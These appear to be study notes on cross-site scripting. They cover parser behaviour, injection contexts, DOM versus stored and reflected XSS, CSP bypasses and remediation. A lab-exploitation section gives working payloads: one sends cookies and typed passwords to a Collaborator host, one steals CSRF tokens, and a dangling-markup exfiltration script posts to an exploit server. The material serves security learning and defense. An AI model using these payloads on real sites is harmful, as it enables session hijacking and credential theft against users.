## 1. Fundamentals & Core Mechanics

### What is XSS?

Cross-Site Scripting (XSS) is a client-side vulnerability that occurs when an application includes untrusted user input within a web page without proper validation or escaping. This allows an attacker to inject and execute malicious JavaScript contextually inside a victim’s browser session.

### Why Do They Arise?

XSS arises due to a fundamental architectural flaw: **the data-vs-code separation failure**. When user-supplied text strings are processed directly by the browser's parsers alongside legitimate executable structures, the browser cannot distinguish between intentional application code and attacker-controlled payload strings.

## 2. Browser Parser & Execution Contexts

### How Browser Parser Decode Input

Browsers utilise three primary distinct internal parser that execute sequentially based on context. They do not share state or understand each other's rules natively:

|**Parser**|**Triggering Context**|**Token Recognition Rules**|**Special Handling**|
|---|---|---|---|
|**HTML Parser**|Standard text nodes, structural tag layouts.|Decodes HTML Entities (e.g., `&lt;` $\rightarrow$ `<`).|Does **not** decode HTML entities inside script block contents (`<script>`).|
|**URL Parser**|Schemes handling resources like `href=`, `src=`.|Decodes Percent Encoding (e.g., `%20` $\rightarrow$ space).|Must see a valid protocol handler scheme first (like `javascript:`).|
|**JavaScript Parser**|Script block interiors, inline event attributes (`onerror`).|Decodes Unicode Escapes (e.g., `\u0061` $\rightarrow$ `a`).|Cannot decode escapes for control syntax tokens (like quotes or parentheses).|

### The Critical `href` Parsing Sequence Exception

When an input reflects inside an anchor tag's resource attribute (`<a href="REFLECTED_DATA">`), the parsing engine follows a specific sequence:

1. **HTML Parser:** Cleans and processes the tag boundary. It translates HTML entities first.
    
2. **URL Parser:** Inspects the processed string. It checks the scheme. If it detects `javascript:`, it treats the trailing data as a URL block and strips percent-encoding (`%22` $\rightarrow$ `"`).
    
3. **JS Parser:** Finally consumes the normalized code string.
    

> ⚠️ **Key Trap:** If you URL-encode a payload (e.g., `%3Calert(1)%3E`) and drop it into a standard HTML text reflection point, it will **fail** because the HTML parser does not decode percent-encoding. But if that exact same URL-encoded payload sits inside an `href` attribute, it **succeeds** because the URL parser intercepts and strips that encoding layer _before_ passing execution rights over to the JavaScript execution thread.

## 3. Core Contexts: HTML vs. JavaScript

### A. HTML Context (Between Tags or Inside Attributes)

- **Target State:** Breaking out of structural boundaries or attribute constraints to inject new tags.
    
- **Pristine Structural Indicators:**
    
    - `</div><script>...</script>` (Tag escape indicator)
        
    - `" autofocus onfocus="alert(1)` (Attribute boundary escape indicator)
        
- **Identification Method:** Inject alphanumeric delimiters paired with structural special characters: `xss'"<>&`. Check the reflected source code to see if the engine treats them as literal structural symbols or converts them into safe display string entities (`&quot;`, `&#39;`, `&lt;`, `&gt;`, `&amp;`).
    
- **When to Stop (Dead End):** Stop immediately if `<`, `>`, `"`, and `'` are completely stripped out, or safely converted into explicit HTML entities _before_ entering text regions where no new attribute assignment can take place.
### B. JavaScript Context (Inside Existing Script Blocks)

- **Target State:** Terminating a literal string sequence or variable declaration to inject inline scripts.
    
- **Pristine Structural Indicators:**
    
    - `'; alert(1); //` (Single quote string delimiter breakthrough indicator)
        
    - `-alert(1)-` (Arithmetic sequence injection inside numeric blocks)
        
- **Identification Method:** Inject tracking character patterns like `';//` or `";//`. Inspect the script parsing block to verify whether your delimiter retains its operational capability to alter code structure or if it gets safely neutralized by backslash-escapes (`\'`).
    
- **When to Stop (Dead End):** Stop if the application correctly enforces structural content filtering, uses rigorous contextual JSON serialization, or maps input directly through defensive type-casting that forces strict numbers.
## 4. DOM-Based XSS vs. Server-Driven Varieties

### The Core Architectural Shift

- **Stored/Reflected XSS:** The malicious payload string payload hits the backend server, processes through backend logic, and prints directly inside the server's HTTP response stream.
    
- **DOM XSS:** The payload never needs to touch the application server. The vulnerability lives entirely client-side. The browser’s own JavaScript reads data from an untrusted client source and dynamically passes it directly into an execution sink within the live document window.
    

```
[Stored/Reflected XSS Flow]  Attacker Parameter -> Server Database/Response -> Browser HTML Engine
[DOM-Based XSS Flow]         Attacker Source (URL/Hash) -> Local JS Logic -> Browser Execution Sink
```

### Strategic DOM Map: Sources and Sinks

To discover or exploit a DOM XSS vulnerability, you must map the pipeline from source to sink:

|**Sources (Controlled Entrypoints)**|**Safe Sinks (Pure Data Views)**|**Dangerous Sinks (Executable Paths)**|
|---|---|---|
|`location.search`|`element.textContent`|`element.innerHTML`|
|`location.hash`|`element.innerText`|`document.write()`|
|`document.referrer`|`element.value`|`eval()` / `setTimeout()`|

### DOM Context Breakouts

Unlike server-side reflections where you scan the raw HTTP response code (`View Source`), identifying DOM vulnerabilities requires inspecting the active **live DOM tree** via the developer tool Console or Elements view (`F12`).

- If your source drops into `innerHTML`, break out exactly like a standard HTML context challenge.
    
- If your source maps directly into an execution engine sink like `eval()`, break string containment variables directly within the active processing loop.

## 5. Vulnerability Classification & Definitive Identification Matrix

To determine with absolute certainty if an XSS vulnerability exists across all archetypes, use the following rigorous verification criteria based on context:

```
                  [Input Reflection Spotted]
                             |
              Is it client-side sourced only?
               /                           \
            (Yes)                          (No)
             /                               \
     [DOM-Based XSS]                Is payload stored permanently?
    Verify Source -> Sink            /                          \
                                  (Yes)                         (No)
                                   /                              \
                           [Stored XSS]                    [Reflected XSS]
```

### 1. Reflected XSS

- **Definitive Proof Requirement:** A specific single HTTP request contains the attack payload in its parameters, and the immediate server response echoes that exact payload string back unencoded within an executable code context of the document window.
    
- **Identification Rule:** The payload executes immediately upon browser rendering of that single response stream.
    

### 2. Stored XSS

- **Definitive Proof Requirement:** The attack payload is submitted once to the backend and saved permanently in a storage system (database, file system, log cache).
    
- **Identification Rule:** Any subsequent request that loads the affected application feature pulls the payload from storage and triggers execution automatically for any user viewing the page.
    

### 3. DOM-Based XSS

- **Definitive Proof Requirement:** The payload string is pulled from a runtime client element (`window.location`) and dynamically integrated into a raw execution sink.
    
- **Identification Rule:** The execution occurs entirely within client memory processing loops; looking at the raw, initial server response source code (`Ctrl+U`) shows zero trace of the payload string.

## 6. Real-World Lab Exploitation Profiles

### Lab 1: Stored XSS to Cookie Theft (Privilege Escalation Vector)

- **Objective:** Exfiltrate session tokens to hijack an active administrator session profile.
    
- **Primary Exploit Vector:**
    
    HTML
    
    ```
    <script>
    fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
        method: 'POST',
        mode: 'no-cors',
        body: document.cookie
    });
    </script>
    ```
    

### Lab 2: Stored XSS to Capture Passwords (Credential Harvesting)

- **Objective:** Construct a phantom login form overlay to harvest plain-text credentials during autofill or interaction sequences.
    
- **Primary Exploit Vector:**
    
    HTML
    
    ```
    <input name=username id=username>
    <input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{method:'POST',mode:'no-cors',body:username.value+':'+this.value});">
    ```
    
- **Expanded Alternative Solution (CSRF-Driven Stored Cross-Post):** Instead of relying on an external out-of-band logger (Burp Collaborator), you can abuse the XSS execution state to force the victim's browser to submit their captured credentials _directly back to the application itself_ as an public blog comment.
    
    - **Standby Implementation:**
        
        HTML
        
        ```
        <script>
        // Phishing form layer generation
        const userField = document.createElement('input'); userField.id = 'user';
        const passField = document.createElement('input'); passField.type = 'password'; passField.id = 'pass';
        document.body.append(userField, passField);
        
        passField.onchange = () => {
            const data = new URLSearchParams();
            data.append('postId', '1'); 
            data.append('comment', 'Harvested: ' + userField.value + ':' + passField.value);
            data.append('name', 'Logger');
            data.append('email', 'log@secure.local');
        
            fetch('/post/comment', { method: 'POST', body: data });
        };
        </script>
        ```
        

### Lab 3: Exploiting XSS to Bypass CSRF Defenses (Session Actions)

- **Objective:** Programmatically bypass anti-CSRF token protection schemes by harvesting tokens on-the-fly to execute profile state changes.
    
- **Primary Exploit Vector:**
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();

function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com');
};
</script>

### Lab 4: Strict CSP Bypass via Dangling Markup (Data Exfiltration)

- **Objective:** Exfiltrate data past an ultra-strict CSP that blocks inline scripts and limits cross-domain data transmission. This leverages a missing `form-action` layout parameter rule via a **Dangling Markup Attack**.
    

```
[Attacker Inject] ---------> <button formaction="EXPLOIT_SERVER" formmethod="GET">Click
                                                                                   |
[Dangling Markup Opens]                                                            |
Appends trailing page contents until it encounters matching closing token          |
                                                                                   v
[Exfiltration Delivery] ----> Captures hidden system CSRF input tokens inside URL stream
```

- **Primary Exploit Vector:**
    
    Plaintext
    
    ```
    foo@bar"><button formaction="https://YOUR-EXPLOIT-SERVER.net/exploit" formmethod="get">Click me</button>
    ```
    
- **Standby Implementation (The Full Automation Receiver Controller Script):** Save this script in your Exploit Server body field to automatically catch incoming tokens and convert them into automated exploitation states:
<body>
<script>
const academyFrontend = "https://your-lab-url.net/";
const exploitServer = "https://your-exploit-server.net/exploit";
const url = new URL(location);
const csrf = url.searchParams.get('csrf');

if (csrf) {
    // Step 2: Token caught. Programmatically execute profile changes via POST
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    token.name = 'csrf';
    token.value = csrf;
    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    form.method = 'post';
    form.action = `${academyFrontend}my-account/change-email`;
    form.append(email, token);
    document.documentElement.append(form);
    form.submit();
} else {
    // Step 1: Initial delivery payload injection step
    location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
}
</script>
</body>

## 7. Strategic Remediation Techniques

To successfully mitigate cross-site scripting vulnerabilities, applications must enforce defenses contextually rather than relying solely on input blacklists:

### 1. Context-Aware Output Encoding

- **HTML Context Defenses:** Convert special structural shell characters directly into safe entity displays:
    
    Plaintext
    
    ```
    <  -->  &lt;
    >  -->  &gt;
    "  -->  &quot;
    '  -->  &#x27;
    ```
    
- **JavaScript Context Defenses:** Avoid direct string reflections. If input must sit inside script blocks, utilize strict **Unicode hex escaping** (`\xHH` or `\uHHHH`) for all non-alphanumeric characters, or pass data via a safely isolated `text/json` structural container layer.
    

### 2. Defending the DOM

- **Avoid Raw HTML Generation:** Replace dangerous sinks like `element.innerHTML = input` with purely structural data assignments like `element.textContent = input`. This ensures the browser treats your string as raw data, skipping the HTML parsing step entirely.
    

### 3. Hardening Infrastructure

- **Enforce Content Security Policy (CSP):** Apply explicit resource tracking rules via the `Content-Security-Policy` HTTP header:
    
    HTTP
    
    ```
    Content-Security-Policy: default-src 'self'; script-src 'self' https://trustedscripts.com; form-action 'self';
    ```
    
- **Set Session Flags:** Protect authentication variables by applying the `HttpOnly` cookie attribute rule. This completely restricts the browser's JavaScript engine from accessing sensitive token data via `document.cookie`, neutralising cookie-theft vectors.

## Content Security Policy (CSP) Deep-Dive & Bypass Mechanics

### What is CSP?

**Content Security Policy (CSP)** is an HTTP response header that acts as a powerful defense-in-depth safety net. It allows site administrators to declare a strict whitelist of trusted sources from which the browser is allowed to load and execute resources (such as JavaScript, CSS, Images, and Fonts).

Think of it as a bouncer for your browser. Even if an attacker finds an XSS vulnerability and injects a `<script>` tag, the browser will look at the CSP header first. If the source of that script isn't on the approved whitelist, the browser locks it down and refuses to run it.

### Common CSP Directives to Know

- **`default-src`**: The fallback policy. If a specific directive (like `script-src`) is missing, the browser uses this.
    
- **`script-src`**: Specifies valid sources for JavaScript. This is the primary battleground for XSS mitigation.
    
- **`form-action`**: Restricts which URLs can receive form submissions (the primary target for dangling markup attacks).
    

### How to Bypass CSP in XSS Scenarios

A CSP bypass happens when the policy has architectural loopholes or weak configurations. If you have an XSS vulnerability but the CSP is blocking your code, you hunt for these specific flaws:

#### 1. Wildcard Over-Permission (`*` or Broad Whitelists)

- **The Flaw**: The policy allows scripts from anywhere or from massive CDNs.
    
    - _Example_: `script-src 'self' https://*.googleapis.com;`
        
- **The Bypass**: If the whitelisted domain hosts JSONP endpoints, open redirects, or angular/react libraries, you can abuse those trusted files to execute your own script.
    

#### 2. The JSONP Callback Trick (Like your DVWA Lab)

- **The Flaw**: The policy trusts `'self'`, but the application hosts a JSONP endpoint that reflects user input without strict validation.
    
- **The Bypass**: You point your injected script source to the local file but use the callback parameter to run your payload:
    
    HTML
    
    ```
    <script src="/source/jsonp.php?callback=alert(1);//"></script>
    ```
    

#### 3. Missing `form-action` (Dangling Markup)

- **The Flaw**: The `script-src` directive is completely secure and locked down, but the developer forgot to define a `form-action` policy.
    
- **The Bypass**: You cannot run JavaScript, so you inject an unclosed HTML tag (like a button or form) that intercepts the page's existing code and exfiltrates sensitive tokens (like CSRF tokens) via a standard HTML form submission to your server.
    

#### 4. Unsafe Directives (`'unsafe-inline'`)

- **The Flaw**: The developer got lazy because their legitimate code broke, so they added `script-src 'self' 'unsafe-inline';`.
    
- **The Bypass**: This completely guts the core protection of CSP against standard XSS. You can execute any basic inline injection like `<svg onload=alert(1)>` directly.
    

### Is XSS Only Limited to CSP?

**No, absolutely not.** It is actually the other way around.

- **XSS is the vulnerability:** It means an attacker can inject malicious code into a web page.
    
- **CSP is just a defense mechanism:** It is a barrier designed to stop that injected code from working.
    

Defeating a CSP does not magically grant you XSS; you must **already have an input reflection or injection point** (XSS) to make use of a CSP bypass. Conversely, even if a website has a flawless, unbreakable CSP, it might still contain severe XSS vulnerabilities—the CSP is simply keeping those vulnerabilities contained and non-executable.

Furthermore, client-side execution security relies on multiple layers working together. Even if you bypass a CSP, you might still run into other defensive roadblocks like:

- **Contextual Browser Quirks**: Differences in how Firefox, Chrome, or Safari parse broken HTML elements.
    
- **Cross-Origin Resource Sharing (CORS)**: Restricting your ability to make asynchronous background data reads across different domains.
    
- **`HttpOnly` Cookie Flags**: Blocking your script from accessing `document.cookie` even if your code executes perfectly.